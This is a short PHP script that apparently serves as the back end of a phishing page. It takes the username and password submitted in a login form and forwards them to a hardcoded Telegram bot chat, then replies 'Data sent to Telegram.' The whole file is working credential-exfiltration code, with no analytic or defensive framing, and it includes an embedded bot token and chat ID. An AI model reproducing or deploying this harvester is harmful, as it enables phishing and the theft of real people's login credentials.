<?php
$chatID = "6260002708";
$token = "AAHAqMPxs6yJLjA6mJImVvkelFf2XDjyqDM";

$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';

$data = array(
    'chat_id' => $chatID,
    'text' => "[== Login Details ==]\nUsername: $username\nPassword: $password\n[== End of Message ==]"
);

$url = "https://api.telegram.org/bot$token/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
curl_close($ch);

echo "Data sent to Telegram.";
?>